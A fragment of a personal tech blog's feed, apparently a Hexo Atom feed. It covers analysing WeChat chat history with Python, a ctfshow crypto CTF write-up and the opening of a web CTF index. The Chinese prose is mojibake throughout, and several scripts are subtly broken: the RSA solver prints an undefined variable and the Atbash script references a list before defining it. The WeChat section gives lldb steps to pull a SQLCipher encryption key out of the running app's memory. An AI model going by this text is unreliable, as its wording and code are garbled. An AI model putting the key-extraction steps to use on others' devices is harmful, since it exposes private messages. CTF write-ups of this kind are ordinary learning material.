class="string">&#x27;å¹´&#x27;</span>+datetime.datetime.fromtimestamp(unixtime).strftime(<span class="string">&#x27;%m&#x27;</span>)+<span class="string">&#x27;æœˆç¬¬ï¼ˆ&#x27;</span>+week[-<span class="number">2</span>:]+<span class="string">&#x27;ï¼‰å‘¨&#x27;</span></span><br><span class="line"><span class="keyword">if</span> statistics_dict.get(week) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line"><span class="comment"># åˆå§‹åŒ–è¿™å‘¨çš„æ•°æ®ä¸ºå…¨ 0</span></span><br><span class="line">statistics_dict[week] = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="comment"># å¯¹åº”çš„å¤©æ•° +1</span></span><br><span class="line">day = <span class="built_in">int</span>(datetime.datetime.fromtimestamp(unixtime).strftime(<span class="string">&#x27;%w&#x27;</span>))</span><br><span class="line">statistics_dict[week][day] = statistics_dict[week][day] + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å¯¹æ•°æ®ç»“æœè¿›è¡Œæ’åº</span></span><br><span class="line">sort = <span class="built_in">sorted</span>(statistics_dict.items(), key=<span class="keyword">lambda</span> x:x[<span class="number">0</span>])</span><br><span class="line">values = []</span><br><span class="line">y_labels = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> sort:</span><br><span class="line">values.append(item[<span class="number">1</span>])</span><br><span class="line">y_labels.append(item[<span class="number">0</span>])</span><br><span class="line">x_labels = [ <span class="string">&quot;å‘¨æ—¥&quot;</span>, <span class="string">&quot;å‘¨ä¸€&quot;</span>, <span class="string">&quot;å‘¨äºŒ&quot;</span>, <span class="string">&quot;å‘¨ä¸‰&quot;</span>, <span class="string">&quot;å‘¨å››&quot;</span>, <span class="string">&quot;å‘¨äº”&quot;</span>, <span class="string">&quot;å‘¨å…­&quot;</span>]</span><br><span class="line"></span><br><span class="line">fig, axe = plt.subplots(figsize = (<span class="number">15</span>, <span class="number">150</span>))</span><br><span class="line">axe.set_xticks(np.arange(<span class="built_in">len</span>(x_labels)))</span><br><span class="line">axe.set_yticks(np.arange(<span class="built_in">len</span>(y_labels)))</span><br><span class="line">axe.set_xticklabels(x_labels)</span><br><span class="line">axe.set_yticklabels(y_labels)</span><br><span class="line">im = axe.imshow(values, cmap=plt.cm.Wistia)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ·»åŠ æ•°å€¼æ ‡ç­¾</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(y_labels)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x_labels)):</span><br><span class="line">        axe.text(j, i, values[i][j], ha=<span class="string">&quot;center&quot;</span>, va=<span class="string">&quot;center&quot;</span>, color=<span class="string">&quot;black&quot;</span>)</span><br><span class="line"></span><br><span class="line">axe.figure.colorbar(im, ax=axe)</span><br><span class="line">plt.savefig(<span class="string">&#x27;history.png&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/history.png" alt="history"></p><h2><span id="lldbæ‰‹åŠ¨æ–¹æ³•åŸç†">lldbæ‰‹åŠ¨æ–¹æ³•ï¼ˆåŸç†ï¼‰</span></h2><p>Tencentçš„å¼€æºé¡¹ç›®WCDB[2]æ˜¯ä¸€ä¸ªé«˜æ•ˆã€å®Œæ•´ã€æ˜“ç”¨çš„ç§»åŠ¨æ•°æ®åº“æ¡†æ¶ï¼ŒåŸºäºSQLCipher[3]ï¼Œæ”¯æŒiOS, macOSå’ŒAndroidã€‚</p><p>SQLCipher[4] ä¸­ä½¿ç”¨ sqlite3_key[5] å‡½æ•°æ‰“å¼€åŠ å¯†çš„æ•°æ®åº“ï¼Œwcdb å°†å…¶å°è£…åœ¨setCipherKey[6]æ–¹æ³•ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int sqlite3_key(sqlite3 *db, const void *pKey, int nKey)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>br set -n sqlite3_key</code> è®¾ç½®å…¶æ–­ç‚¹ã€‚å†ä½¿ç”¨<code>memory read --size 1 --format x --count 32 $rsi</code> è·å– pKey ä¼ å‚çš„å€¼ï¼š</p><p>armåˆ™æ˜¯<code>memory read --size 1 --format x --count 32 $x1</code></p><ol><li><p>æ‰“å¼€ç”µè„‘ç«¯å¾®ä¿¡ï¼ˆä¸è¦ç™»é™†ï¼‰</p></li><li><p>åœ¨Terminalè¾“å…¥å‘½ä»¤<code>lldb -p $(pgrep WeChat)</code></p></li></ol><p>   <img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/1.jpg" alt="lldb"></p><ol start="3"><li><p><code>br set -n sqlite3_key</code> è®¾ç½®æ–­ç‚¹</p></li><li><p>è¾“å…¥<code>c</code>ï¼Œå›è½¦ï¼ˆç»§ç»­è¿è¡Œ</p></li><li><p>ç™»é™†ç”µè„‘ç«¯å¾®ä¿¡</p></li><li><p>è¾“å…¥<code>memory read --size 1 --format x --count 32 $x1</code>ï¼Œå›è½¦</p></li></ol><p><img src="/2023/10/22/python%E5%A4%84%E7%90%86%E5%BE%AE%E4%BF%A1%E8%81%8A%E5%A4%A9%E8%AE%B0%E5%BD%95/2.jpg"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ori_key=<span class="string">&quot;&quot;&quot;0x600001ea4760: 0x1b 0x89 0xb2 0x6f 0xf2 0xfd 0x48 0x2e</span></span><br><span class="line"><span class="string">0x600001ea4768: 0x98 0x7a 0xdd 0x77 0xdc 0x4b 0xc2 0x63</span></span><br><span class="line"><span class="string">0x600001ea4770: 0xd6 0xff 0xa2 0x78 0x14 0x36 0x46 0x65</span></span><br><span class="line"><span class="string">0x600001ea4778: 0x89 0xaf 0xca 0x80 0xaa 0xa8 0xe6 0xa3&quot;&quot;&quot;</span></span><br><span class="line">key = <span class="string">&#x27;0x&#x27;</span> + <span class="string">&#x27;&#x27;</span>.join(i.partition(<span class="string">&#x27;:&#x27;</span>)[<span class="number">2</span>].replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> ori_key.split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">1</span>:<span class="number">5</span>])</span><br><span class="line"><span class="built_in">print</span>(key)</span><br></pre></td></tr></table></figure><hr><p>æ–‡ä¸­æœ‰å½©è›‹å“¦<font color="white">å‰åŠæ®µçš„å¯†æ–‡ä¸ºZmRhbGFpYV9tZ2xtï¼ŒååŠæ®µéšå†™åœ¨â¤ï¸é‡Œé¢å˜»å˜»</font></p><p>æäº¤åˆ°Gittalkæœ‰å¥–åŠ±å“¦ğŸ˜„</p><hr><p>å‚è€ƒğŸ”—ï¼š</p><p><a href="https://sspai.com/post/82577">å¯¼å‡ºå¤šå¹´å¾®ä¿¡èŠå¤©è®°å½•ï¼Œæˆ‘ç”¨å¯è§†åŒ–åˆ†æäº†å‡ºè‡ªå·±çš„å£å¤´ç¦…</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="python è¯äº‘ å¾®ä¿¡" scheme="https://disda-coding.github.io/tags/python-%E8%AF%8D%E4%BA%91-%E5%BE%AE%E4%BF%A1/"/>
    
  </entry>
  
  <entry>
    <title>kali</title>
    <link href="https://disda-coding.github.io/2023/07/20/kali/"/>
    <id>https://disda-coding.github.io/2023/07/20/kali/</id>
    <published>2023-07-20T07:59:25.000Z</published>
    <updated>2023-07-20T08:00:02.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#kali-%E5%AE%89%E8%A3%85-parallel-tools">Kali å®‰è£… Parallel Tools</a></li></ul><!-- tocstop --><h1><span id="kali-å®‰è£…-parallel-tools">Kali å®‰è£… Parallel Tools</span></h1>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>ctfshow-Crypto</title>
    <link href="https://disda-coding.github.io/2023/05/08/ctfshow-Crypto/"/>
    <id>https://disda-coding.github.io/2023/05/08/ctfshow-Crypto/</id>
    <published>2023-05-08T07:13:49.000Z</published>
    <updated>2023-05-22T01:07:37.892Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#crypto">Crypto</a><ul><li><a href="#javascript">JavaScript</a></li><li><a href="#rsa">RSA</a></li><li><a href="#rabbit%E5%8A%A0%E5%AF%86">RabbitåŠ å¯†</a></li><li><a href="#ook%E5%8A%A0%E5%AF%86">Ookï¼åŠ å¯†</a></li><li><a href="#brainfuck%E7%BC%96%E7%A0%81">BrainFuckç¼–ç </a></li><li><a href="#quoted-printable%E7%BC%96%E7%A0%81">Quoted-printableç¼–ç </a></li><li><a href="#md5">MD5</a></li><li><a href="#%E5%87%AF%E6%92%92%E5%AF%86%E7%A0%81caesar-cipher">å‡¯æ’’å¯†ç Caesar cipher</a></li><li><a href="#%E5%9F%83%E7%89%B9%E5%B7%B4%E4%BB%80%E7%A0%81">åŸƒç‰¹å·´ä»€ç </a></li><li><a href="#%E5%BD%93%E9%93%BA%E5%AF%86%E7%A0%81">å½“é“ºå¯†ç </a></li><li><a href="#%E8%B4%B9%E7%BA%B3%E5%A7%86%E5%AF%86%E7%A0%81">è´¹çº³å§†å¯†ç </a><ul><li><a href="#crypto13">crypto13</a></li></ul></li><li><a href="#%E5%9F%B9%E6%A0%B9%E5%AF%86%E7%A0%81">åŸ¹æ ¹å¯†ç </a><ul><li><a href="#%E8%90%8C%E6%96%B0-%E5%AF%86%E7%A0%813">èŒæ–° å¯†ç 3</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="crypto">Crypto</span></h1><p><a href="https://www.cnblogs.com/ruoli-s/p/14206145.html#brainfuck%E7%BC%96%E7%A0%81">CTFå¸¸è§ç¼–ç åŠåŠ è§£å¯†</a></p><h2><span id="javascript">JavaScript</span></h2><p><a href="http://www.hiencode.com/jsfuck.html">jsåœ¨çº¿åŠ è§£å¯†</a></p><p><a href="https://www.bugku.com/tools/jsfuck/">jsfuck</a></p><ul><li>false       &#x3D;&gt;  ![]</li><li>true        &#x3D;&gt;  !![]</li><li>undefined   &#x3D;&gt;  [][[]]</li><li>NaN         &#x3D;&gt;  +[![]]</li><li>0           &#x3D;&gt;  +[]</li><li>1           &#x3D;&gt;  +!+[]</li><li>2           &#x3D;&gt;  !+[]+!+[]</li><li>10          &#x3D;&gt;  [+!+[]]+[+[]]</li><li>Array       &#x3D;&gt;  []</li><li>Number      &#x3D;&gt;  +[]</li><li>String      &#x3D;&gt;  []+[]</li><li>Boolean     &#x3D;&gt;  ![]</li><li>Function    &#x3D;&gt;  [][â€œfilterâ€]</li><li>eval        &#x3D;&gt;  [][â€œfilterâ€][â€œconstructorâ€]( CODE )()</li><li>window      &#x3D;&gt;  [][â€œfilterâ€][â€œconstructorâ€](â€œreturn thisâ€)()</li></ul><h2><span id="rsa">RSA</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">q=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">e=<span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="comment"># c=int(input())</span></span><br><span class="line"><span class="comment"># m=int(input())</span></span><br><span class="line">d=gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># m=pow(c,d,p*q)</span></span><br><span class="line"><span class="comment"># c=pow(m,e,p*q)</span></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure><h2><span id="rabbitåŠ å¯†">RabbitåŠ å¯†</span></h2><ul><li>ç‰¹ç‚¹ï¼šU2FsdGVkX1å¼€å¤´çš„å¯èƒ½æ˜¯rabbitï¼ŒAESï¼ŒDES</li></ul><p><a href="https://tool.acy.moe/rabbitencrypt/">åœ¨çº¿åŠ è§£å¯†ç½‘ç«™</a></p><h2><span id="ookåŠ å¯†">Ookï¼åŠ å¯†</span></h2><ul><li>ç‰¹ç‚¹ï¼šåŒ…å«äº†Ook</li></ul><h2><span id="brainfuckç¼–ç ">BrainFuckç¼–ç </span></h2><ul><li>ç‰¹ç‚¹ï¼šå«+ç‡å¾ˆé«˜ï¼ŒBrainFuck è¯­è¨€åªæœ‰å…«ç§ç¬¦å·ï¼Œæ‰€æœ‰çš„æ“ä½œéƒ½ç”±è¿™å…«ç§ç¬¦å· <strong>(&gt; &lt; + - . , [ ])</strong> çš„ç»„åˆæ¥å®Œæˆã€‚</li></ul><h2><span id="quoted-printableç¼–ç ">Quoted-printableç¼–ç </span></h2><ul><li>ç‰¹ç‚¹ï¼šä»»ä½•ä¸€ä¸ª8ä½çš„å­—èŠ‚å€¼å¯ç¼–ç ä¸º3ä¸ªå­—ç¬¦ï¼šä¸€ä¸ªç­‰å·â€&#x3D;â€åè·Ÿéšä¸¤ä¸ªåå…­è¿›åˆ¶æ•°å­—(0â€“9æˆ–Aâ€“F)è¡¨ç¤ºè¯¥å­—èŠ‚çš„æ•°å€¼.</li></ul><p><a href="http://web.chacuo.net/charsetquotedprintable">è§£å¯†ç½‘ç«™</a></p><h2><span id="md5">MD5</span></h2><ul><li>ç‰¹ç‚¹ï¼šæœ‰å›ºå®šé•¿åº¦ï¼Œä¸€èˆ¬æ˜¯32ä½æˆ–è€…16ä½ï¼Œç”±æ•°å­—â€œ0-9â€å’Œå­—æ¯â€œa-fâ€ç»„æˆ</li></ul><p><a href="https://www.somd5.com/">å¯ä»¥è§£ä¸€äº›é•¿åº¦ä¸å¤Ÿçš„md5</a></p><h2><span id="å‡¯æ’’å¯†ç caesar-cipher">å‡¯æ’’å¯†ç Caesar cipher</span></h2><p>æˆ‘å†™äº†ä¸ªè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment"># å¯†æ–‡</span></span><br><span class="line">s=<span class="string">&#x27;gmbh&#123;ifmmp_dug&#125;&#x27;</span></span><br><span class="line">res = []</span><br><span class="line"><span class="comment"># ç­”æ¡ˆåŒ…å«çš„å­—ç¬¦ä¸²</span></span><br><span class="line">flag = <span class="string">&#x27;flag&#x27;</span></span><br><span class="line"><span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">26</span>):</span><br><span class="line">    str_decrypt=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> s:</span><br><span class="line">        <span class="comment">#é‡åˆ°éå­—æ¯å°±è·³è¿‡</span></span><br><span class="line">        <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;[a-zA-Z]&#x27;</span>, word) <span class="keyword">is</span> <span class="literal">None</span>:  </span><br><span class="line">            str_decrypt+=word</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> re.<span class="keyword">match</span>(<span class="string">&#x27;[a-z]&#x27;</span>, word):</span><br><span class="line">            word_decrypt=<span class="built_in">chr</span>((<span class="built_in">ord</span>(word)-<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>) -n) %<span class="number">26</span> +<span class="built_in">ord</span>(<span class="string">&quot;a&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            word_decrypt=<span class="built_in">chr</span>((<span class="built_in">ord</span>(word)-<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>) -n) %<span class="number">26</span> +<span class="built_in">ord</span>(<span class="string">&quot;A&quot;</span>))</span><br><span class="line">        str_decrypt += word_decrypt</span><br><span class="line">    res.append(str_decrypt)</span><br><span class="line">ans = <span class="built_in">list</span>(<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:flag <span class="keyword">in</span> x,res))</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br></pre></td></tr></table></figure><h2><span id="åŸƒç‰¹å·´ä»€ç ">åŸƒç‰¹å·´ä»€ç </span></h2><ul><li><p>å…¶åŸç†ä¸ºï¼šå®ƒä½¿ç”¨å­—æ¯è¡¨ä¸­çš„æœ€åä¸€ä¸ªå­—æ¯ä»£è¡¨ç¬¬ä¸€ä¸ªå­—æ¯ï¼Œå€’æ•°ç¬¬äºŒä¸ªå­—æ¯ä»£è¡¨ç¬¬äºŒä¸ªå­—æ¯ã€‚åœ¨ç½—é©¬å­—æ¯è¡¨ä¸­ï¼Œå®ƒæ˜¯è¿™æ ·å‡ºç°çš„ï¼š æ˜æ–‡ï¼šA B C D E F G H I J K L M N O P Q R S T U V W X Y Z å¯†æ–‡ï¼šZ Y X W V U T S R Q P O N M L K J I H G F E D C B A </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">alp = [<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>)]</span><br><span class="line">ALP = [<span class="built_in">chr</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">26</span>)]</span><br><span class="line">pla = alp[::-<span class="number">1</span>]</span><br><span class="line">PLA = PLA[::-<span class="number">1</span>]</span><br><span class="line">dic_a = <span class="built_in">dict</span>(<span class="built_in">zip</span>(alp,pla))</span><br><span class="line">dic = <span class="built_in">dict</span>(dic_a,**<span class="built_in">dict</span>(<span class="built_in">zip</span>(ALP,PLA)))</span><br><span class="line">words = <span class="string">&#x27;uozt&#123;Zgyzhv_xlwv_uiln_xguhsld&#125;&#x27;</span></span><br><span class="line">decypt = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> words:</span><br><span class="line">    decypt += dic[w] <span class="keyword">if</span> re.<span class="keyword">match</span>(<span class="string">&#x27;[a-zA-Z]&#x27;</span>, w) <span class="keyword">else</span> w</span><br><span class="line"><span class="built_in">print</span>(decypt)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="å½“é“ºå¯†ç ">å½“é“ºå¯†ç </span></h2><ul><li><p>æ ¹æ®å½“å‰æ±‰å­—æœ‰å¤šå°‘ç¬”ç”»å‡ºå¤´ï¼Œå¯¹åº”çš„æ˜æ–‡å°±æ˜¯æ•°å­—å‡ ã€‚</p><blockquote><p>ç‹ï¼šè¯¥å­—å¤–é¢æœ‰ 6 ä¸ªå‡ºå¤´çš„ä½ç½®ï¼Œæ‰€ä»¥è¯¥æ±‰å­—å¯¹åº”çš„æ•°å­—å°±æ˜¯ 6ï¼›</p><p>å£ï¼šè¯¥å­—å¤–é¢æ²¡æœ‰å‡ºå¤´çš„ä½ç½®ï¼Œé‚£å°±æ˜¯0ï¼›</p><p>äººï¼šè¯¥å­—å¤–é¢æœ‰ 3 ä¸ªå‡ºå¤´çš„ä½ç½®ï¼Œæ‰€ä»¥è¯¥æ±‰å­—å¯¹åº”çš„æ•°å­—å°±æ˜¯ 3ï¼›</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">s =<span class="string">&#x27;ç”°ç”±ä¸­äººå·¥å¤§ç‹å¤«äº•ç¾Š&#x27;</span></span><br><span class="line">en_str = <span class="string">&#x27;ç”±ç”°ä¸­ ç”±ç”°äº• ç¾Šå¤« ç”±ç”°äºº ç”±ä¸­äºº ç¾Šç¾Š ç”±ç”±ç‹ ç”±ç”°ä¸­ ç”±ç”±å¤§ ç”±ç”°å·¥ ç”±ç”±ç”± ç”±ç”±ç¾Š ç”±ä¸­å¤§&#x27;</span></span><br><span class="line">l = en_str.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> w <span class="keyword">in</span> l:</span><br><span class="line">    k=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> w:</span><br><span class="line">        k+=<span class="built_in">str</span>(s.index(item))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(k)),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></li></ul><h2><span id="è´¹çº³å§†å¯†ç ">è´¹çº³å§†å¯†ç </span></h2><h3><span id="crypto13">crypto13</span></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;/Users/disda/Desktop/è®¡ç®—æœºåŸ¹è®­/ç½‘å®‰/ctfshow/baseå®¶æ—/base.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    text = f.read()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        text = base64.b64decode(text).decode()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            text = base64.b32decode(text).decode()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                text = base64.b16decode(text).decode()</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(text)</span><br></pre></td></tr></table></figure><h2><span id="åŸ¹æ ¹å¯†ç ">åŸ¹æ ¹å¯†ç </span></h2><ol><li><p>å¯†æ–‡ä½¿ç”¨è‹±æ–‡è¯­å¥æ¥è¡¨ç¤ºä½¿ç”¨å¤§å°å†™æ¥åŒºåˆ†æ˜¯aè¿˜æ˜¯bï¼Œå¦‚æœå¯†æ–‡ä¸ºå¤§å†™é‚£ä¹ˆåŠ å¯†å°±æ˜¯ç¬¬ä¸€ç§æ–¹å¼ä½¿ç”¨å¯†æ–‡çš„æ¯ä¸ªå­—æ¯å¤§å°å†™æ¥åˆ¤å®šæ˜¯aè¿˜æ˜¯bï¼ˆå¤§å†™ä¸ºa,å°å†™ä¸ºbï¼‰â€”å•æ–‡æœ¬è¯­å¥æ¨¡å¼</p></li><li><p>å¯†æ–‡ä½¿ç”¨è‹±æ–‡è¯­å¥ä½¿ç”¨ä¸¤ç§ä¸åŒçš„Â·å­—ä½“æ¥åŒºåˆ†a,bé€šå¸¸(å°†ç¬¬ä¸€ç§å­—ä½“è½¬æ¢ä¸ºaï¼Œç¬¬äºŒç§å­—ä½“è½¬æ¢ä¸ºb)</p></li></ol><h3><span id="èŒæ–°-å¯†ç 3">èŒæ–° å¯†ç 3</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">é¢˜ç›®åç§°ï¼šæˆ‘æƒ³åƒåŸ¹æ ¹ é¢˜ç›®æè¿°ï¼š -- --- .-. ... . ..--.- .. ... ..--.- -.-. --- --- .-.. ..--.- -... ..- - ..--.- -... .- -.-. --- -. ..--.- .. ... ..--.- -.-. --- --- .-.. . .-. ..--.- -- -- -.. -.. -- -.. -- -.. -- -- -- -.. -.. -.. /-- -.. -- -.. -.. --/ -- -- -- -- -- /-- -.. -.. -- -.. -- /-- -.. -.. -- æ ¼å¼ï¼šflag&#123;***********&#125;</span><br></pre></td></tr></table></figure><p>æ”¾å…¥CyberChefä¸­è·å¾—</p><p><code>MORSE_IS_COOL_BUT_BACON_IS_COOLER_MMDDMDMDMMMDDDMDMDDMMMMMMMDDMDMMDDM</code></p><p>ç„¶åå°†Mæ¢æˆAï¼ŒDæ¢æˆBï¼Œè§£ç é€‰æ‹©Completeè·å¾—<code>GUOWANG</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/categories/ctf/"/>
    
    
    <category term="ctf" scheme="https://disda-coding.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-Webç¯‡</title>
    <link href="https://disda-coding.github.io/2023/04/19/ctfshow-Web%E7%AF%87/"/>
    <id>https://disda-coding.github.io/2023/04/19/ctfshow-Web%E7%AF%87/</id>
    <published>2023-04-19T09:51:30.000Z</published>
    <updated>2023-10-13T08:42:44.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><span id="more"></span><!-- toc --><ul><li><a href="#web%E5%85%A5%E9%97%A8">WEBå…¥é—¨</a><ul><li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">ä¿¡æ¯æ”¶é›†</a><ul><li><a href="#web05">web05</a></li><li><a href="#web10">web10</a></li><li><a href="#web12">web12</a></li><li><a href="#web13">web13</a></li><li><a href="#web14">web14</a></li><li><a href="#web15">web15</a></li><li><a href="#web16">web16</a></li><li><a href="#web20">web20</a></li></ul></li><li><a href="#%E7%88%86%E7%A0%B4">çˆ†ç ´</a><ul><li><a href="#web21">web21</a></li><li><a href="#web22">web22</a></li><li><a href="#web23">web23</a></li><li><a href="#web25">web25</a></li><li><a href="#web28">web28</a></li></ul></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">å‘½ä»¤æ‰§è¡Œ</a><ul><li><a href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%96%B9%E6%B3%95%E6%B1%87%E6%80%BB">å‘½ä»¤æ‰§è¡Œæ–¹æ³•æ±‡æ€»</a></li><li><a href="#web37">web37</a></li><li><a href="#web41">web41</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%88%AA%E6%96%AD">å‘½ä»¤æˆªæ–­</a></li><li><a href="#web54">web54</a></li><li><a href="#web55">web55</a></li><li><a href="#web57">web57</a></li><li><a href="#web58">web58</a></li><li><a href="#web71">web71</a></li><li><a 